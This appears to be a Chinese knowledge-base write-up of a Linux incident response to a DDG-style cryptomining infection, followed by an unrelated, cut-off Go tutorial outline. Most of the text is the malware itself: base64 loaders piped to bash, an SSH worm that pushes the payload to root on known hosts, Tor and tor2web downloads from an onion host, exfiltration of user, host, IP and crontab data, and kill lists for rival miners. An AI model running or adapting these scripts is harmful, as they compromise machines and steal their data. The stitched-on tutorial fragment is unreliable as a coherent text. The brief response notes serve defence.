UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHVVVUVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash' hosts=$(grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" ~/.bash_history /etc/hosts ~/.ssh/known_hosts |grep -v ^127.|awk -F: {'print $2'}|sort|uniq) for h in $hosts do ssh -oBatchMode=yes -oConnectTimeout=5 -oPasswordAuthentication=no -oPubkeyAuthentication=yes -oStrictHostKeyChecking=no -l root $h 'echo UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash' # ssh -o BatchMode=yes(将不会显示交互式口令输入) -o ConnectTimeout=5(超时时间5s) -o PasswordAuthentication=no(不使用密码认证) -o PubkeyAuthentication=yes (使用公钥认证) -o StrictHostKeyChecking=no (不记录远程主机的公钥到knows_hosts) -l root (登录名为root) $h(ip) 'echo xxx'(植入程序，下载挖矿程序代码，并执行) done # 以当前用户名登录内网机器 for h in $hosts;do ssh -oBatchMode=yes -oConnectTimeout=5 -oPasswordAuthentication=no -oPubkeyAuthentication=yes -oStrictHostKeyChecking=no -l $USER $h 'echo UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash';done } ibot() { f=/bot # r 是输出本机相关信息及计划任务作为字符串拼接 r=$(curl -4fsSLk ip.sb||wget -4qO- ip.sb||curl -4fsSLk checkip.amazonaws.com)_$(whoami)_$(uname -m)_$(uname -n)_$(crontab -l|base64 -w0) # curl -x socks5h://$s:9050 -e 下载脚本 $c -x socks5h://$s:9050 -e$r $t.onion$f || $c -e$r $1$f } iscn() { # pkill -9 -f 删除tracepath进程 pkill -9 -f tracepath # $f 字符串 f=/trc # $x 时间md5格式化字符串 x=./$(date|md5sum|cut -f1 -d-) # 下载脚本 $c -x socks5h://$s:9050 $t.onion$f -o$x || $c $1$f -o$x # 添加x权限，执行，删除 chmod +x $x;$x;rm -f $x } # dns解析 sockz # fexe # 下载curl，cron等 isys # 内网投毒，并在该机器上下载脚本执行 issh & ibot $t.tor2web.in || ibot $t.tor2web.io || ibot $t.tor2web.su || iscn $t.onion.com.de || iscn $t.onion.sh iscn $t.tor2web.in || iscn $t.tor2web.io || iscn $t.tor2web.su || iscn $t.onion.com.de || iscn $t.onion.sh QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK exec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin find /etc/cron*|xargs chattr -i find /var/spool/cron*|xargs chattr -i crontab -l |grep -ivE \"70OXQG|Malware|Miner|VUses5|\\-unix|\\.\\/oka|\\.configrc|\\.rsync|\\/upd|aliyun|basht|bffbe|curl|jqu\\.js|kill_virus|kpccv|malware|mazec|nullc|qcloud|rvlss|ryukd|systemd-init|th2ps|titanagent|tmp00|ucxin|unixdb|unixoa|wget|wlvly|xzfix\" |crontab - crontab -l ;grep -iRE \"70OXQG|Malware|Miner|VUses5|\\-unix|\\.\\/oka|\\.configrc|\\.rsync|\\/upd|aliyun|basht|bffbe|curl|jqu\\.js|kill_virus|kpccv|malware|mazec|nullc|qcloud|rvlss|ryukd|systemd-init|th2ps|titanagent|tmp00|ucxin|unixdb|unixoa|wget|wlvly|xzfix\" /etc/cron.*|cut -f 1 -d :|xargs rm -f rm -f $HOME/.{kpccv,xzfix,th2ps,bffbe,rvlss,wlvly,ucxin,mazec,ryukd,unixdb,unixoa,aliyun,70OXQG,titanagent,VUses5}.sh rm -f /opt/{kpccv,xzfix,th2ps,bffbe,rvlss,wlvly,ucxin,mazec,ryukd,unixdb,unixoa,aliyun,70OXQG,titanagent,VUses5}.sh rm -f /etc/cron.d/0{kpccv,xzfix,th2ps,bffbe,rvlss,wlvly,ucxin,mazec,ryukd,unixdb,unixoa,aliyun,70OXQG,titanagent,VUses5} rm -f /root/killMiner.sh /opt/killMiner.sh /home/kill_virus.sh /root/fixMalwareTemp.sh /root/.killer pkill -9 -f \"./cron|./oka|\\-unix|/tmp/ddgs|/tmp/idk|/tmp/java|/tmp/keep|/tmp/udevs|/tmp/udk|/tmp/update.sh|/tmp/yarn|/usr/bin/netfs|8220|AliHids|AliYunDun|descargars|Donald|HT8s|Jonason|steasec|salt-store|salt-minion|SzdXM|X13-unix|X17-unix|\\[stea\\]|aegis_|AliYunDun|AliHids|AliHips|AliYunDunUpdatealiyun-service|azipl|bash64|bigd1ck|cr.sh|crloger|cronds|crun|cryptonight|curn|currn|ddgs|dhcleint|fs-manager|gf128mul|havegeds|httpdz|irqbalanced|java-c|kaudited|kdevtmpfsi|kerberods|khugepageds|kinsing|kintegrityds|kpsmouseds|kswaped|kthreadds|kthrotlds|kw0|kworkerds|kworkre|kwroker|lsof|lopata|Macron|mewrs|migrations|miner|mmm|mr.sh|muhsti|mygit|netdns|networkservice|orgfs|pamdicks|pastebin|qW3xT|qwefdas|rctlcli|sleep|stratum|sustes|sustse|sysguard|sysguerd|systeamd|systemd-network|sysupdate|sysupdata|t00ls|thisxxs|Trump|update.sh|vTtHH|watchbog|watchbug|watchog|wipefs|wnTKYg|x3Wq|xig|xmr|zer0\" netstat -antp|grep -E \"103.3.62.64|104.140.201.42|104.140.244.186|107.178.104.10|107.191.99.221|107.191.99.95|116.203.73.240|131.153.56.98|131.153.76.130|136.243.102.154|138.201.20.89|138.201.27.243|138.201.36.249|139.162.132.70|139.162.60.220|139.162.81.90|139.99.101.197|139.99.101.198|139.99.101.232|139.99.102.70|139.99.102.71|139.99.102.72|139.99.102.73|139.99.102.74|139.99.120.50|139.99.120.75|139.99.123.196|139.99.124.170|139.99.125.38|139.99.156.30|139.99.68.128|142.44.242.100|142.44.243.6|144.217.14.109|144.217.14.139|147.135.37.31|149.202.42.174|149.202.83.171|15.236.100.141|151.80.144.188|158.69.25.62|158.69.25.71|158.69.25.77|163.172.203.178|163.172.206.67|163.172.207.69|163.172.226.114|163.172.226.137|172.104.143.224|172.104.151.232|172.104.159.158|172.104.165.191|172.104.247.21|172.104.76.21|172.105.205.58|172.105.205.68|172.105.210.117|172.105.211.250|172.105.235.97|178.63.100.197|18.180.72.219|18.210.126.40|192.110.160.114|192.99.69.170|195.154.62.247|195.201.12.107|199.231.85.124|207.246.100.198|213.32.29.143|213.32.74.157|217.182.169.148|23.88.160.140|3.0.193.200|37.187.95.110|37.59.43.131|37.59.44.193|37.59.44.93|37.59.54.205|37.59.55.60|37.9.3.26|45.32.71.82|45.76.65.223|45.79.192.137|45.79.200.97|45.79.204.241|45.79.210.48|46.4.120.18|47.101.30.124|5.196.13.29|5.196.23.240|51.15.54.102|51.15.55.100|51.15.55.162|51.15.58.224|51.15.65.182|51.15.67.17|51.15.69.136|51.15.78.68|51.255.34.118|51.255.34.79|51.255.34.80|51.81.245.40|54.188.223.206|54.37.7.208|66.42.105.146|78.46.49.222|78.46.87.181|81.25.55.79|81.91.189.245|88.99.142.163|88.99.193.240|88.99.242.92|91.121.140.167|94.130.12.27|94.130.12.30|94.130.143.162|94.130.165.85|94.130.165.87|94.130.239.15|94.23.23.52|94.23.247.226|95.216.209.67|205.185.118.204|63.250.33.43|185.199.11|139.99.121.227|199.192.30.2\"|awk {'print $NF'} |cut -d/ -f1|xargs kill -9 ss -antp |grep -E \"103.3.62.64|104.140.201.42|104.140.244.186|107.178.104.10|107.191.99.221|107.191.99.95|116.203.73.240|131.153.56.98|131.153.76.130|136.243.102.154|138.201.20.89|138.201.27.243|138.201.36.249|139.162.132.70|139.162.60.220|139.162.81.90|139.99.101.197|139.99.101.198|139.99.101.232|139.99.102.70|139.99.102.71|139.99.102.72|139.99.102.73|139.99.102.74|139.99.120.50|139.99.120.75|139.99.123.196|139.99.124.170|139.99.125.38|139.99.156.30|139.99.68.128|142.44.242.100|142.44.243.6|144.217.14.109|144.217.14.139|147.135.37.31|149.202.42.174|149.202.83.171|15.236.100.141|151.80.144.188|158.69.25.62|158.69.25.71|158.69.25.77|163.172.203.178|163.172.206.67|163.172.207.69|163.172.226.114|163.172.226.137|172.104.143.224|172.104.151.232|172.104.159.158|172.104.165.191|172.104.247.21|172.104.76.21|172.105.205.58|172.105.205.68|172.105.210.117|172.105.211.250|172.105.235.97|178.63.100.197|18.180.72.219|18.210.126.40|192.110.160.114|192.99.69.170|195.154.62.247|195.201.12.107|199.231.85.124|207.246.100.198|213.32.29.143|213.32.74.157|217.182.169.148|23.88.160.140|3.0.193.200|37.187.95.110|37.59.43.131|37.59.44.193|37.59.44.93|37.59.54.205|37.59.55.60|37.9.3.26|45.32.71.82|45.76.65.223|45.79.192.137|45.79.200.97|45.79.204.241|45.79.210.48|46.4.120.18|47.101.30.124|5.196.13.29|5.196.23.240|51.15.54.102|51.15.55.100|51.15.55.162|51.15.58.224|51.15.65.182|51.15.67.17|51.15.69.136|51.15.78.68|51.255.34.118|51.255.34.79|51.255.34.80|51.81.245.40|54.188.223.206|54.37.7.208|66.42.105.146|78.46.49.222|78.46.87.181|81.25.55.79|81.91.189.245|88.99.142.163|88.99.193.240|88.99.242.92|91.121.140.167|94.130.12.27|94.130.12.30|94.130.143.162|94.130.165.85|94.130.165.87|94.130.239.15|94.23.23.52|94.23.247.226|95.216.209.67|205.185.118.204|63.250.33.43|185.199.11|139.99.121.227|199.192.30.2\" |awk -F, {'print $2'}|sed 's/pid=//g' |xargs kill -9 chattr -i /etc/hosts grep -q onion /etc/hosts && sed -i '/onion/d' /etc/hosts grep -q tor2w /etc/hosts && sed -i '/tor2w/d' /etc/hosts grep -R /tmp/.X11-unix /root/*|cut -d: -f1|xargs rm -f grep -R /tmp/.X11-unix /opt/*|cut -d: -f1|xargs rm -f QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK exec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) c=$(echo \"curl -4fsSLkA- -m200\") t=$(echo \"4k6jta4zrwzm7u54am3vnjpnlvlbujyvrtprytf4scmrw7u3udmgqaqd\") sockz() { n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) p=$(echo \"dns-query?name=relay.tor2socks.in\") s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) } fexe() { for i in /dev/shm /usr/bin $d /tmp /var/tmp ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done } u() { sockz fexe f=/cpu x=./$(date|md5sum|cut -f1 -d-) $c -x socks5h://$s:9050 $t.onion$f -o$x || $c $1$f -o$x chmod +x $x;$x;rm -f $x } for h in tor2web.in tor2web.su tor2web.io tor2web.to onion.sh onion.com.de do if ! ls /proc/$(head -1 /tmp/.X11-unix/11)/maps; then u $t.$h else break fi done QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK exec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) c=$(echo \"curl -4fsSLkA- -m200\") t=$(echo \"4k6jta4zrwzm7u54am3vnjpnlvlbujyvrtprytf4scmrw7u3udmgqaqd\") sockz() { n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) p=$(echo \"dns-query?name=relay.tor2socks.in\") s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) } u() { sockz f=/cmd $c -x socks5h://$s:9050 $t.onion$f || $c $1$f } ( u $t.tor2web.in || u $t.tor2web.io || u $t.tor2web.su || u $t.onion.com.de || u $t.onion.sh || u $t.tor2web.to )|bash QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK exec &>/dev/null export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) c=$(echo \"curl -4sSLkA- -m200\") t=$(echo \"4k6jta4zrwzm7u54am3vnjpnlvlbujyvrtprytf4scmrw7u3udmgqaqd\") sockz() { n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) p=$(echo \"dns-query?name=relay.tor2socks.in\") s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) } ibot() { sockz f=/bot r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0) $c -X POST -x socks5h://$s:9050 -e$r $t.onion$f || $c -X POST -e$r $1$f } ibot $t.tor2web.in || ibot $t.tor2web.io || ibot $t.tor2web.su || ibot $t.onion.com.de || ibot $t.tor2web.to || ibot $t.onion.sh QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK chattr -i /tmp/.X11-unix chattr -Ri /tmp/.X11-unix [ -f /tmp/.X11-unix ] && rm -f /tmp/.X11-unix [ -d /tmp/.X11-unix ] || mkdir -p /tmp/.X11-unix 应急过程 卸载curl命令，防止外连，先降低cpu（脚本未使用 wget，apt，yum 等下载curl，而是使用本机的curl去执行动作） 椒图查看进程 -> 无果（当时未发现恶意进程） 椒图查看日志 -> 发现了恶意的进程，但是pid都执行完就给删除了，在服务器里未查询到执行生成病毒文件，定时任务的pid和文件 椒图扫描恶意二进制文件 -> 发现恶意的二进制文件（已被删除）,但进程还存在（椒图给报了） 查看该进程的内存块，使用gdb attch ${pid}，发现确实有删除文件的那一段内存，dump memory进程地址，只有第一段内存能dump下来，（删除文件那段内存已经不存在了），dump下第一段内存，发现了执行内容（base64编码），全部解码发现不能解码成功，但是发现有多处|base64 -d|，挨个解码发现，发现了该病毒注入到内存 ，所以清理不掉 重启服务器 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:49:58 Author: aaron Url: https://byaaronluo.github.io/知识库/03.主机安全/21.Linux应急响应案例（DDG挖矿）.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/01.GO基础/":{"url":"知识库/04.编程开发/01.GO/01.GO基础/","title":"01.GO基础","keywords":"","body":" 介绍 Hello World GO语言基础 工作空间 环境变量 包路径 包名 包文档 代码结构 代码编译运行 快速运行 安装到本地 远程下载并编译 交叉编译 代码测试 GO标记 标识符 关键字 行分隔符; 注释 字符串连接 格式化字符串 数据类型 数字类型 浮点型 其他数字类型 值类型和引用类型 GO开发基础 声明变量 声明常量 运算符 算术运算符 关系运算符 逻辑运算符 位运算符 赋值运算符 其他运算符 运算符优先级 空白标识符 格式化输出 条件语句 if if...else if...else if...else switch select 循环语句 for for each 无限循环 循环控制 init函数 自定义函数 构造函数与复合字面 作用域 局部变量 全局变量 数组 初始化数组 访问数组 指针 使用指针 空指针 指针数组 结构体 定义结构体 访问成员 结构体作为参数 结构体指针 切片 定义切片 初始化切片 空(nil)切片 切片截取 len()和cap()函数 追加元素 append()和copy()函数 集合(Map) 定义Map 删除元素 范围(Range) 类型转换 递归 阶乘实例 斐波那契数列实例 接口 声明接口 实现接口 new和make new make defer 并发 go程 通道（channel） 通道缓冲区 注意事项 遍历通道 关闭通道 异常处理 生成error Panic异常 恢复 介绍 Go语言(Golang)最初是由Robert Griesemer, Rob 